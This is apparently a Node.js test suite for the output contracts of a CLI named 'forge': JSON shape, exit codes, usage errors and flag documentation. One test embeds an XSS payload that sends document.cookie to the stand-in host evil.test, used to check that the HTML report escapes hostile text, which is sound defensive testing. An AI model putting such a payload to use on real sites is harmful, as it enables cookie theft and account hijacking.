// Output contracts of the graduated commands (src/contracts.js), checked end to end.
//
// Each case runs the real CLI in a fixture repository, once with --json and once without,
// and checks three things a script relies on:
//   1. stdout under --json is one JSON document that satisfies the command's contract;
//   2. the exit status is the documented one, and the same with and without --json;
//   3. on a usage error stdout is empty, so a script never parses half a result.
// It also checks that every flag a strict command's handler reads is in its help entry,
// so the strict guard (src/cli/args.js) cannot refuse a flag the command actually uses.
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, before, test } from "node:test";
import { fileURLToPath } from "node:url";
import { COMMANDS, commandHelp } from "../src/commands.js";
import { CONTRACTS, contractCommands } from "../src/contracts.js";
import { violations } from "../src/schema.js";

const HERE = dirname(fileURLToPath(import.meta.url));
const CLI = join(HERE, "..", "src", "cli.js");
let root = "";

/** @param {string[]} args */
function forge(args, { cwd = root, env = {} } = {}) {
  const r = spawnSync(process.execPath, [CLI, ...args], {
    cwd,
    encoding: "utf8",
    env: { ...process.env, NO_COLOR: "1", FORGE_LLM: "off", ...env },
    timeout: 120000,
  });
  return { code: r.status ?? -1, stdout: r.stdout ?? "", stderr: r.stderr ?? "" };
}

const put = (rel, text) => {
  mkdirSync(dirname(join(root, rel)), { recursive: true });
  writeFileSync(join(root, rel), text);
};
const git = (...args) => execFileSync("git", args, { cwd: root, stdio: "pipe" });

before(() => {
  // The real path: on macOS the temp directory is a symlink (/var → /private/var), and the
  // CLI reports paths from its own working directory, which is always resolved.
  root = realpathSync.native(mkdtempSync(join(tmpdir(), "forge-contracts-")));
  git("init", "-q");
  git("config", "user.email", "contracts@test.invalid");
  git("config", "user.name", "contracts");
  git("config", "commit.gpgsign", "false");
  put("package.json", '{ "name": "fx", "type": "module" }\n');
  put(
    "src/math.js",
    "export function add(a, b) { return a + b; }\n" +
      "export function retryPush(fn, n = 3) {\n" +
      "  for (let i = 0; i < n; i++) { try { return fn(); } catch {} }\n" +
      '  throw new Error("push failed");\n}\n',
  );
  put(
    "src/app.js",
    'import { add, retryPush } from "./math.js";\n' +
      "export const total = (xs) => xs.reduce(add, 0);\n" +
      "export const push = (f) => retryPush(f);\n",
  );
  put(
    "test/math.test.js",
    'import assert from "node:assert/strict";\nimport { test } from "node:test";\n' +
      'import { add } from "../src/math.js";\ntest("add", () => assert.equal(add(1, 2), 3));\n',
  );
  put(
    "src/Card.html",
    '<div class="rounded-lg shadow-md bg-white p-4 text-gray-700"><h2 class="text-xl font-bold">' +
      'Title</h2><button class="bg-blue-500 text-white px-4 py-2 rounded">Go</button></div>\n',
  );
  git("add", "-A");
  git("commit", "-qm", "fixture");
  assert.equal(forge(["atlas", "build"]).code, 0, "the fixture gets a code atlas");
});

after(() => rmSync(root, { recursive: true, force: true }));

/**
 * @param {string} key contract key
 * @param {string[]} args the command line without --json
 * @param {number} exit the documented exit status
 */
function check(key, args, exit) {
  const contract = CONTRACTS[key];
  assert.ok(contract, `contract ${key} exists`);
  const json = forge([...args, "--json"]);
  assert.equal(json.code, exit, `${args.join(" ")} --json exits ${exit}\n${json.stderr}`);
  let body;
  try {
    body = JSON.parse(json.stdout);
  } catch {
    assert.fail(`${args.join(" ")} --json printed something that is not JSON:\n${json.stdout}`);
  }
  assert.deepEqual(violations(body, contract.spec, key), [], `${key} satisfies its contract`);
  const text = forge(args);
  assert.equal(text.code, exit, `${args.join(" ")} exits ${exit} without --json too`);
  return body;
}

test("taste: list, pin and refusal", () => {
  const listed = check("taste list", ["taste"], 0);
  assert.ok(listed.styles.length > 0);
  const style = listed.styles[0];
  assert.equal(check("taste apply", ["taste", style], 0).style, style);
  const err = forge(["taste", "no-such-style", "--json"]);
  assert.equal(err.code, 1);
  assert.deepEqual(violations(JSON.parse(err.stdout), CONTRACTS["taste refused"].spec), []);
  // A DESIGN.md the user wrote is never overwritten.
  put("DESIGN.md", "# ours\n");
  assert.equal(forge(["taste", style]).code, 1);
  assert.equal(readFileSync(join(root, "DESIGN.md"), "utf8"), "# ours\n");
  rmSync(join(root, "DESIGN.md"));
});

test("uicheck: contrast, fingerprint and design", () => {
  assert.equal(
    check("uicheck contrast", ["uicheck", "contrast", "#000000", "#ffffff"], 0).level,
    "AAA",
  );
  assert.equal(
    check("uicheck contrast", ["uicheck", "contrast", "#777777", "#ffffff"], 1).level,
    "fail",
  );
  check("uicheck contrast", ["uicheck", "contrast", "#777777", "#ffffff", "--large"], 0);
  check("uicheck fingerprint", ["uicheck", "fingerprint", "src/Card.html"], 0);
  const design = forge(["uicheck", "design", "src/Card.html", "--json"]);
  const body = JSON.parse(design.stdout);
  assert.deepEqual(violations(body, CONTRACTS["uicheck design"].spec), []);
  assert.equal(design.code, body.verdict === "pass" ? 0 : 1, "exit follows the verdict");
  assert.equal(forge(["uicheck", "design", "src/Card.html"]).code, design.code);
  // A named theme that does not exist is an error, not a silent no-op.
  assert.equal(forge(["uicheck", "design", "src/Card.html", "--theme", "nope.css"]).code, 1);
});

test("imagine: a named symbol is predicted; a task naming nothing predicts nothing", () => {
  const hit = check("imagine", ["imagine", "change add in src/math.js"], 0);
  assert.equal(hit.found, true);
  assert.ok(hit.targets.includes("src/math.js"), hit.targets.join(","));
  assert.ok(hit.predictedBreaks.some((b) => b.file === "src/app.js"));
  const none = check("imagine", ["imagine", "make it faster"], 0);
  assert.equal(none.found, false);
  assert.deepEqual(none.targets, []);
});

test("imagine --run: a verdict in a clean tree; refusal on a dirty one", () => {
  const ran = check(
    "imagine --run",
    ["imagine", "change add in src/math.js", "--run", "--sandbox", "off"],
    0,
  );
  assert.equal(ran.dryRun.ok, true, ran.dryRun.reason);
  assert.equal(ran.dryRun.worktree, "removed");
  put("src/math.js", `${readFileSync(join(root, "src/math.js"), "utf8")}// edit\n`);
  const dirty = forge(["imagine", "change add in src/math.js", "--run", "--json"]);
  assert.equal(dirty.code, 1);
  assert.equal(dirty.stdout.trim(), "", "a refusal prints no JSON to stdout");
  git("checkout", "-q", "--", "src/math.js");
});

test("lean and anchor: a working change measured against a task and a goal", () => {
  put(
    "src/math.js",
    `${readFileSync(join(root, "src/math.js"), "utf8")}export const sub = (a, b) => a - b;\n`,
  );
  const lean = check("lean", ["lean", "add a sub function"], 0);
  assert.equal(lean.hasDiff, true);
  const drift = check("anchor", ["anchor", "add a sub function"], 0);
  assert.ok(drift.changed.includes("src/math.js"));
  assert.equal(
    check("anchor set", ["anchor", "set", "add a sub function"], 0).goal,
    "add a sub function",
  );
  assert.equal(check("anchor show", ["anchor", "show"], 0).goal, "add a sub function");
  check("anchor", ["anchor"], 0);
  assert.equal(check("anchor clear", ["anchor", "clear"], 0).cleared, true);
  assert.equal(check("anchor show", ["anchor", "show"], 0).goal, null);
  const missing = forge(["anchor", "--json"]);
  assert.equal(missing.code, 1, "no goal given and none stored");
  assert.equal(missing.stdout.trim(), "");
  git("checkout", "-q", "--", "src/math.js");
});

test("diagnose: the third identical failure crosses the threshold", () => {
  const args = ["diagnose", "TypeError: x is undefined at line 12", "--file", "src/app.js"];
  const first = check("diagnose", args, 0);
  assert.equal(first.thrash, false);
  forge(args);
  const third = forge([...args, "--json"]);
  assert.equal(third.code, 0, "escalation is advice, not a failing exit");
  const body = JSON.parse(third.stdout);
  assert.deepEqual(violations(body, CONTRACTS.diagnose.spec), []);
  assert.equal(body.thrash, true);
  assert.ok(body.count >= 3);
});

test("deja, reuse and collide", () => {
  check("deja", ["deja", "add two numbers"], 0);
  // The diagnosis minted by the previous test is a solved-work claim deja can find.
  const seen = check("deja", ["deja", "TypeError x is undefined at line 12 in src/app.js"], 0);
  assert.ok(seen.length >= 1, "the earlier diagnosis is found");
  check("reuse stats", ["reuse", "stats"], 0);
  check("reuse query", ["reuse", "query", "add two numbers"], 0);
  const minted = check(
    "reuse mint",
    ["reuse", "mint", "add two numbers", "--file", "src/math.js", "--ref", "fixture-run-1"],
    0,
  );
  assert.equal(minted.ok, true);
  const refused = forge(["reuse", "mint", "add", "--file", "nope.js", "--json"]);
  assert.equal(refused.code, 1, "a refused mint fails with --json too");
  assert.deepEqual(violations(JSON.parse(refused.stdout), CONTRACTS["reuse mint"].spec), []);
  assert.equal(JSON.parse(refused.stdout).ok, false);
  assert.equal(forge(["reuse", "mint", "add", "--file", "nope.js"]).code, 1);
  check("collide", ["collide"], 0);
  check("collide", ["collide", "src/math.js"], 0);
});

test("rank: a report with an atlas, exit 1 without one", () => {
  const r = check("rank", ["rank", "--top", "3"], 0);
  assert.ok(r.topFiles.length <= 3 && r.topFiles.length > 0);
  check("rank", ["rank", "--task", "change retryPush"], 0);
  const bare = mkdtempSync(join(tmpdir(), "forge-contracts-bare-"));
  try {
    const none = forge(["rank", "--json"], { cwd: bare });
    assert.equal(none.code, 1);
    assert.equal(none.stdout.trim(), "");
  } finally {
    rmSync(bare, { recursive: true, force: true });
  }
});

test("report: the default path, a named path, and refusals that protect other files", () => {
  const r = check("report", ["report"], 0);
  assert.ok(r.path.endsWith(join(".forge", "report.html")));
  const named = check("report", ["report", "--out", "snapshot.html"], 0);
  assert.equal(named.path, join(root, "snapshot.html"));
  // A second run may overwrite its own earlier report…
  check("report", ["report", "--out", "snapshot.html"], 0);
  // …but never a file it did not write, unless told to.
  put("notes.html", "<p>mine</p>\n");
  const refused = forge(["report", "--out", "notes.html", "--json"]);
  assert.equal(refused.code, 1);
  assert.deepEqual(violations(JSON.parse(refused.stdout), CONTRACTS["report refused"].spec), []);
  assert.equal(readFileSync(join(root, "notes.html"), "utf8"), "<p>mine</p>\n");
  assert.equal(forge(["report", "--out", "notes.html"]).code, 1);
  check("report", ["report", "--out", "notes.html", "--force"], 0);
  assert.equal(forge(["report", "--out", "no-such-dir/r.html"]).code, 1);
  assert.equal(forge(["report", "--out", "src"]).code, 1, "a directory is refused");
  for (const f of ["snapshot.html", "notes.html"]) rmSync(join(root, f));
});

test("report: text others wrote is escaped, and the page can run nothing", async () => {
  const { renderReport, REPORT_POLICY } = await import("../src/report.js");
  const { mintClaim } = await import("../src/ledger.js");
  const { putClaim, repoLedger } = await import("../src/ledger_store.js");
  const hostile =
    '<img src=x onerror="fetch(`//evil.test/`+document.cookie)"><script>alert(1)</script>';
  const minted = mintClaim({
    kind: "fact",
    body: { name: "hostile", text: hostile },
    scope: { level: "repo" },
    provenance: { author: "someone-else", agent: "test" },
    t: 1,
  });
  assert.ok(minted.ok);
  putClaim(repoLedger(root), minted.claim);
  const html = renderReport(root);
  assert.ok(!html.includes("<script>alert"), "no raw script from a claim");
  assert.ok(!html.includes("<img src=x"), "no raw tag from a claim");
  assert.ok(html.includes("&lt;script&gt;alert(1)&lt;/script&gt;"));
  assert.ok(html.includes(`content="${REPORT_POLICY}"`));
  assert.equal((html.match(/<script\b/g) ?? []).length, 0, "the report has no script at all");
});

test("dash --json: one line once listening, then a clean stop; a busy port exits 1", async () => {
  const { spawn } = await import("node:child_process");
  const child = spawn(process.execPath, [CLI, "dash", "--port", "0", "--json"], {
    cwd: root,
    env: { ...process.env, NO_COLOR: "1" },
  });
  const line = await new Promise((resolve, reject) => {
    let out = "";
    child.stdout.on("data", (b) => {
      out += b;
      if (out.includes("\n")) resolve(out.split("\n")[0]);
    });
    child.on("exit", (code) => reject(new Error(`dash exited ${code} before listening`)));
    setTimeout(() => reject(new Error("dash did not start")), 20000);
  });
  const body = JSON.parse(String(line));
  assert.deepEqual(violations(body, CONTRACTS.dash.spec), []);
  assert.ok(!String(line).includes("token"), "the write token is never printed");
  const page = await fetch(`${body.url}/`);
  assert.equal(page.status, 200);
  // The port is now taken: a second server on it is refused with a reason, not a stack trace.
  const busy = forge(["dash", "--port", String(body.port), "--json"]);
  assert.equal(busy.code, 1);
  assert.deepEqual(violations(JSON.parse(busy.stdout), CONTRACTS["dash refused"].spec), []);
  assert.match(JSON.parse(busy.stdout).error, /is in use/);
  const exited = new Promise((resolve) =>
    child.once("exit", (code, signal) => resolve({ code, signal })),
  );
  child.kill(process.platform === "win32" ? undefined : "SIGTERM");
  const end = /** @type {{code: number|null, signal: string|null}} */ (await exited);
  if (process.platform !== "win32") assert.equal(end.code, 0, "SIGTERM is a clean stop");
});

test("usage errors: exit 1, nothing on stdout, a reason on stderr", () => {
  const cases = [
    [["deja", "--json"], /usage/],
    [["lean", "--json"], /usage/],
    [["diagnose", "--json"], /usage/],
    [["deja", "x", "--jsn"], /unknown flag --jsn \(did you mean --json\?\)/],
    [["rank", "--top", "0"], /--top must be a whole number from 1/],
    [["rank", "--top", "many"], /--top must be a whole number/],
    [["rank", "--task"], /--task needs a value/],
    [
      ["uicheck", "contrast", "#000", "#fff", "--mint"],
      /--mint applies to fingerprint, not contrast/,
    ],
    [["uicheck", "#000", "#fff", "--theme", "x.css"], /--theme applies to fingerprint, design/],
    [["imagine", "change add", "--sandbox", "off"], /--sandbox only applies together with --run/],
    [
      ["imagine", "change add", "--run", "--sandbox", "maybe"],
      /--sandbox must be one of auto, required, off/,
    ],
    [["reuse", "query", "x", "--file", "a.js"], /--file applies to mint, not query/],
    [["taste", "a", "b"], /usage/],
    [["collide", "--json=yes"], /--json takes no value/],
    [["report", "--force"], /--force only applies together with --out/],
    [["report", "--out"], /--out needs a value/],
    [["dash", "--port", "70000"], /--port must be a whole number from 0 to 65535/],
    [["dash", "--prot", "1"], /unknown flag --prot \(did you mean --port\?\)/],
  ];
  for (const [args, reason] of cases) {
    const r = forge(/** @type {string[]} */ (args));
    assert.equal(r.code, 1, `${args.join(" ")} exits 1`);
    assert.equal(r.stdout.trim(), "", `${args.join(" ")} prints nothing on stdout`);
    assert.match(r.stderr, /** @type {RegExp} */ (reason), `${args.join(" ")}: ${r.stderr}`);
  }
});

test("every graduated command is strict, documents its exit statuses, and has a contract", () => {
  for (const name of contractCommands()) {
    const h = commandHelp(name);
    assert.ok(h?.strict, `${name} is strict`);
    assert.ok(h.exit.length > 0, `${name} documents its exit statuses`);
    assert.ok(h.examples.length > 0, `${name} has an example`);
    assert.ok(h.usage.startsWith(`forge ${name}`), `${name} has a usage line`);
  }
  for (const [key, c] of Object.entries(CONTRACTS)) {
    assert.ok(Number.isInteger(c.version) && c.version >= 1, `${key} has a version`);
    assert.ok(COMMANDS[key.split(" ")[0]], `${key} names a real command`);
  }
});

/** The source of one handler: from `HANDLERS.<name> = ` to the next top-level definition. */
function handlerSource(name) {
  const files = [join(HERE, "..", "src", "cli.js")];
  for (const f of ["memory", "verification", "cloud"])
    files.push(join(HERE, "..", "src", "cli", `${f}.js`));
  for (const f of files) {
    const s = readFileSync(f, "utf8");
    const i = s.indexOf(`HANDLERS.${name} = async`);
    if (i < 0) continue;
    const rest = s.slice(i + 10);
    const j = rest.search(
      /\n(HANDLERS\.[a-zA-Z]+ = |export |function |async function |\/\*\* |const [A-Z_]+ = )/,
    );
    return rest.slice(0, j < 0 ? undefined : j);
  }
  return null;
}

/** Literals in a handler that look like flags but are arguments to another program. */
const NOT_OUR_FLAGS = new Set(["--porcelain"]);

test("every flag a strict handler reads is documented, so the guard never refuses it", () => {
  for (const name of Object.keys(COMMANDS)) {
    const h = commandHelp(name);
    if (!h?.strict) continue;
    const src = handlerSource(name);
    if (src === null) continue;
    const declared = new Set(h.flags.map((f) => /^--[a-z0-9-]+/.exec(f.flag)?.[0]).filter(Boolean));
    const read = [...src.matchAll(/["'`](--[a-z][a-z0-9-]*)/g)].map((m) => m[1]);
    for (const flag of read)
      if (!NOT_OUR_FLAGS.has(flag))
        assert.ok(declared.has(flag), `${name} reads ${flag} but its help does not declare it`);
  }
});

test("a value-taking flag is typed from its label, quoted placeholders included", async () => {
  const { optionTable } = await import("../src/cli/args.js");
  for (const name of Object.keys(COMMANDS)) {
    const h = commandHelp(name);
    if (!h?.strict) continue;
    const { options } = optionTable(h.flags);
    for (const f of h.flags) {
      const m = /^--([a-z][a-z0-9-]*)(.*)$/.exec(f.flag);
      if (!m) continue;
      const takesValue = m[2].trim().length > 0;
      assert.equal(options[m[1]].type, takesValue ? "string" : "boolean", `${name} ${f.flag}`);
    }
  }
});
